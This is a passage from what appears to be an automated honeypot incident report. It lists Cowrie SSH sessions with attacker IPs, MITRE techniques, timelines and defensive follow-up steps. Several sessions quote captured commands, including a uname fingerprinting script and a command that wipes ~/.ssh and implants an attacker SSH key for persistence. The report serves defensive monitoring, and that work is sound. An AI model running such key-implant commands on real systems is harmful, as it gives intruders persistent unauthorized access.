| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:28:37` | `cowrie.session.connect` |
| `2026-07-06 05:28:37` | `cowrie.client.version` |
| `2026-07-06 05:28:37` | `cowrie.client.kex` |
| `2026-07-06 05:28:38` | `cowrie.login.success` |
| `2026-07-06 05:28:39` | `cowrie.session.params` |
| `2026-07-06 05:28:39` | `cowrie.command.input` |
| `2026-07-06 05:28:39` | `cowrie.command.failed` |
| `2026-07-06 05:28:39` | `cowrie.log.closed` |
| `2026-07-06 05:28:39` | `cowrie.session.params` |
| `2026-07-06 05:28:39` | `cowrie.command.input` |
| `2026-07-06 05:28:40` | `cowrie.session.file_download` |
| `2026-07-06 05:28:40` | `cowrie.log.closed` |
| `2026-07-06 05:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.250[.]9` to AbuseIPDB if not already reported
- [ ] Block `207.154.250[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac76d18cc66e

| Field | Detail |
|---|---|
| **Source IP** | `207.154.250[.]9` |
| **First Seen** | 2026-07-06 05:28 |
| **Last Seen** | 2026-07-06 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:28:40` | `cowrie.session.connect` |
| `2026-07-06 05:28:40` | `cowrie.client.version` |
| `2026-07-06 05:28:40` | `cowrie.client.kex` |
| `2026-07-06 05:28:40` | `cowrie.login.success` |
| `2026-07-06 05:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.250[.]9` to AbuseIPDB if not already reported
- [ ] Block `207.154.250[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ad7701c34dd

| Field | Detail |
|---|---|
| **Source IP** | `207.154.250[.]9` |
| **First Seen** | 2026-07-06 05:28 |
| **Last Seen** | 2026-07-06 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:28:40` | `cowrie.session.connect` |
| `2026-07-06 05:28:40` | `cowrie.client.version` |
| `2026-07-06 05:28:40` | `cowrie.client.kex` |
| `2026-07-06 05:28:41` | `cowrie.login.success` |
| `2026-07-06 05:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.250[.]9` to AbuseIPDB if not already reported
- [ ] Block `207.154.250[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46935ecf348b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:29 |
| **Last Seen** | 2026-07-06 05:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:29:06` | `cowrie.session.connect` |
| `2026-07-06 05:29:07` | `cowrie.client.version` |
| `2026-07-06 05:29:07` | `cowrie.client.kex` |
| `2026-07-06 05:29:10` | `cowrie.login.success` |
| `2026-07-06 05:29:12` | `cowrie.session.params` |
| `2026-07-06 05:29:12` | `cowrie.command.input` |
| `2026-07-06 05:29:12` | `cowrie.command.input` |
| `2026-07-06 05:29:12` | `cowrie.command.input` |
| `2026-07-06 05:29:12` | `cowrie.command.input` |
| `2026-07-06 05:29:12` | `cowrie.command.input` |
| `2026-07-06 05:29:12` | `cowrie.command.success` |
| `2026-07-06 05:29:12` | `cowrie.command.input` |
| `2026-07-06 05:29:12` | `cowrie.command.input` |
| `2026-07-06 05:29:12` | `cowrie.command.input` |
| `2026-07-06 05:29:12` | `cowrie.command.input` |
| `2026-07-06 05:29:13` | `cowrie.log.closed` |
| `2026-07-06 05:29:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a4adee26b2

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-07-06 05:29 |
| **Last Seen** | 2026-07-06 05:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:29:42` | `cowrie.session.connect` |
| `2026-07-06 05:29:42` | `cowrie.client.version` |
| `2026-07-06 05:29:42` | `cowrie.client.kex` |
| `2026-07-06 05:29:43` | `cowrie.login.success` |
| `2026-07-06 05:29:44` | `cowrie.session.params` |
| `2026-07-06 05:29:44` | `cowrie.command.input` |
| `2026-07-06 05:29:44` | `cowrie.command.failed` |
| `2026-07-06 05:29:44` | `cowrie.log.closed` |
| `2026-07-06 05:29:45` | `cowrie.session.params` |
| `2026-07-06 05:29:45` | `cowrie.command.input` |
| `2026-07-06 05:29:45` | `cowrie.session.file_download` |
| `2026-07-06 05:29:45` | `cowrie.log.closed` |
| `2026-07-06 05:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c71e161a0e

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-07-06 05:29 |
| **Last Seen** | 2026-07-06 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:29:46` | `cowrie.session.connect` |
| `2026-07-06 05:29:46` | `cowrie.client.version` |
| `2026-07-06 05:29:46` | `cowrie.client.kex` |
| `2026-07-06 05:29:46` | `cowrie.login.success` |
| `2026-07-06 05:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-347513595ef0

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-07-06 05:29 |
| **Last Seen** | 2026-07-06 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:29:47` | `cowrie.session.connect` |
| `2026-07-06 05:29:47` | `cowrie.client.version` |
| `2026-07-06 05:29:47` | `cowrie.client.kex` |
| `2026-07-06 05:29:48` | `cowrie.login.success` |
| `2026-07-06 05:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21469c23408

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:29 |
| **Last Seen** | 2026-07-06 05:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:29:52` | `cowrie.session.connect` |
| `2026-07-06 05:29:52` | `cowrie.client.version` |
| `2026-07-06 05:29:52` | `cowrie.client.kex` |
| `2026-07-06 05:29:56` | `cowrie.login.success` |
| `2026-07-06 05:29:58` | `cowrie.session.params` |
| `2026-07-06 05:29:58` | `cowrie.command.input` |
| `2026-07-06 05:29:58` | `cowrie.command.input` |
| `2026-07-06 05:29:58` | `cowrie.command.input` |
| `2026-07-06 05:29:58` | `cowrie.command.input` |
| `2026-07-06 05:29:58` | `cowrie.command.input` |
| `2026-07-06 05:29:58` | `cowrie.command.success` |
| `2026-07-06 05:29:58` | `cowrie.command.input` |
| `2026-07-06 05:29:58` | `cowrie.command.input` |
| `2026-07-06 05:29:58` | `cowrie.command.input` |
| `2026-07-06 05:29:58` | `cowrie.command.input` |
| `2026-07-06 05:29:59` | `cowrie.log.closed` |
| `2026-07-06 05:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d519fc58fe98

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:30 |
| **Last Seen** | 2026-07-06 05:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:30:41` | `cowrie.session.connect` |
| `2026-07-06 05:30:42` | `cowrie.client.version` |
| `2026-07-06 05:30:42` | `cowrie.client.kex` |
| `2026-07-06 05:30:45` | `cowrie.login.success` |
| `2026-07-06 05:30:47` | `cowrie.session.params` |
| `2026-07-06 05:30:47` | `cowrie.command.input` |
| `2026-07-06 05:30:47` | `cowrie.command.input` |
| `2026-07-06 05:30:47` | `cowrie.command.input` |
| `2026-07-06 05:30:47` | `cowrie.command.input` |
| `2026-07-06 05:30:47` | `cowrie.command.input` |
| `2026-07-06 05:30:47` | `cowrie.command.success` |
| `2026-07-06 05:30:47` | `cowrie.command.input` |
| `2026-07-06 05:30:47` | `cowrie.command.input` |
| `2026-07-06 05:30:47` | `cowrie.command.input` |
| `2026-07-06 05:30:47` | `cowrie.command.input` |
| `2026-07-06 05:30:48` | `cowrie.log.closed` |
| `2026-07-06 05:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b320cc62638c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 05:30 |
| **Last Seen** | 2026-07-06 05:31 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:30:47` | `cowrie.session.connect` |
| `2026-07-06 05:30:49` | `cowrie.client.version` |
| `2026-07-06 05:30:49` | `cowrie.client.kex` |
| `2026-07-06 05:30:55` | `cowrie.login.success` |
| `2026-07-06 05:30:59` | `cowrie.session.params` |
| `2026-07-06 05:30:59` | `cowrie.command.input` |
| `2026-07-06 05:31:01` | `cowrie.log.closed` |
| `2026-07-06 05:31:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b8cf354cd75

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:31 |
| **Last Seen** | 2026-07-06 05:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:31:29` | `cowrie.session.connect` |
| `2026-07-06 05:31:29` | `cowrie.client.version` |
| `2026-07-06 05:31:30` | `cowrie.client.kex` |
| `2026-07-06 05:31:33` | `cowrie.login.success` |
| `2026-07-06 05:31:35` | `cowrie.session.params` |
| `2026-07-06 05:31:35` | `cowrie.command.input` |
| `2026-07-06 05:31:35` | `cowrie.command.input` |
| `2026-07-06 05:31:35` | `cowrie.command.input` |
| `2026-07-06 05:31:35` | `cowrie.command.input` |
| `2026-07-06 05:31:35` | `cowrie.command.input` |
| `2026-07-06 05:31:35` | `cowrie.command.success` |
| `2026-07-06 05:31:35` | `cowrie.command.input` |
| `2026-07-06 05:31:35` | `cowrie.command.input` |
| `2026-07-06 05:31:35` | `cowrie.command.input` |
| `2026-07-06 05:31:35` | `cowrie.command.input` |
| `2026-07-06 05:31:35` | `cowrie.log.closed` |
| `2026-07-06 05:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd45606ce66f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:32 |
| **Last Seen** | 2026-07-06 05:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:32:16` | `cowrie.session.connect` |
| `2026-07-06 05:32:16` | `cowrie.client.version` |
| `2026-07-06 05:32:16` | `cowrie.client.kex` |
| `2026-07-06 05:32:19` | `cowrie.login.success` |
| `2026-07-06 05:32:21` | `cowrie.session.params` |
| `2026-07-06 05:32:21` | `cowrie.command.input` |
| `2026-07-06 05:32:21` | `cowrie.command.input` |
| `2026-07-06 05:32:21` | `cowrie.command.input` |
| `2026-07-06 05:32:21` | `cowrie.command.input` |
| `2026-07-06 05:32:21` | `cowrie.command.input` |
| `2026-07-06 05:32:21` | `cowrie.command.success` |
| `2026-07-06 05:32:21` | `cowrie.command.input` |
| `2026-07-06 05:32:21` | `cowrie.command.input` |
| `2026-07-06 05:32:21` | `cowrie.command.input` |
| `2026-07-06 05:32:21` | `cowrie.command.input` |
| `2026-07-06 05:32:22` | `cowrie.log.closed` |
| `2026-07-06 05:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c95515db91ed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:33 |
| **Last Seen** | 2026-07-06 05:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:33:01` | `cowrie.session.connect` |
| `2026-07-06 05:33:02` | `cowrie.client.version` |
| `2026-07-06 05:33:02` | `cowrie.client.kex` |
| `2026-07-06 05:33:05` | `cowrie.login.success` |
| `2026-07-06 05:33:07` | `cowrie.session.params` |
| `2026-07-06 05:33:07` | `cowrie.command.input` |
| `2026-07-06 05:33:07` | `cowrie.command.input` |
| `2026-07-06 05:33:07` | `cowrie.command.input` |
| `2026-07-06 05:33:07` | `cowrie.command.input` |
| `2026-07-06 05:33:07` | `cowrie.command.input` |
| `2026-07-06 05:33:07` | `cowrie.command.success` |
| `2026-07-06 05:33:07` | `cowrie.command.input` |
| `2026-07-06 05:33:07` | `cowrie.command.input` |
| `2026-07-06 05:33:07` | `cowrie.command.input` |
| `2026-07-06 05:33:07` | `cowrie.command.input` |
| `2026-07-06 05:33:08` | `cowrie.log.closed` |
| `2026-07-06 05:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c1b3341520

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:33 |
| **Last Seen** | 2026-07-06 05:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:33:47` | `cowrie.session.connect` |
| `2026-07-06 05:33:48` | `cowrie.client.version` |
| `2026-07-06 05:33:48` | `cowrie.client.kex` |
| `2026-07-06 05:33:51` | `cowrie.login.success` |
| `2026-07-06 05:33:53` | `cowrie.session.params` |
| `2026-07-06 05:33:53` | `cowrie.command.input` |
| `2026-07-06 05:33:53` | `cowrie.command.input` |
| `2026-07-06 05:33:53` | `cowrie.command.input` |
| `2026-07-06 05:33:53` | `cowrie.command.input` |
| `2026-07-06 05:33:53` | `cowrie.command.input` |
| `2026-07-06 05:33:53` | `cowrie.command.success` |
| `2026-07-06 05:33:53` | `cowrie.command.input` |
| `2026-07-06 05:33:53` | `cowrie.command.input` |
| `2026-07-06 05:33:53` | `cowrie.command.input` |
| `2026-07-06 05:33:53` | `cowrie.command.input` |
| `2026-07-06 05:33:54` | `cowrie.log.closed` |
| `2026-07-06 05:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657e27d2df62

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:34 |
| **Last Seen** | 2026-07-06 05:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:34:33` | `cowrie.session.connect` |
| `2026-07-06 05:34:33` | `cowrie.client.version` |
| `2026-07-06 05:34:33` | `cowrie.client.kex` |
| `2026-07-06 05:34:37` | `cowrie.login.success` |
| `2026-07-06 05:34:39` | `cowrie.session.params` |
| `2026-07-06 05:34:39` | `cowrie.command.input` |
| `2026-07-06 05:34:39` | `cowrie.command.input` |
| `2026-07-06 05:34:39` | `cowrie.command.input` |
| `2026-07-06 05:34:39` | `cowrie.command.input` |
| `2026-07-06 05:34:39` | `cowrie.command.input` |
| `2026-07-06 05:34:39` | `cowrie.command.success` |
| `2026-07-06 05:34:39` | `cowrie.command.input` |
| `2026-07-06 05:34:39` | `cowrie.command.input` |
| `2026-07-06 05:34:39` | `cowrie.command.input` |
| `2026-07-06 05:34:39` | `cowrie.command.input` |
| `2026-07-06 05:34:39` | `cowrie.log.closed` |
| `2026-07-06 05:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-393f1f4fd182

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:35 |
| **Last Seen** | 2026-07-06 05:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:35:19` | `cowrie.session.connect` |
| `2026-07-06 05:35:19` | `cowrie.client.version` |
| `2026-07-06 05:35:19` | `cowrie.client.kex` |
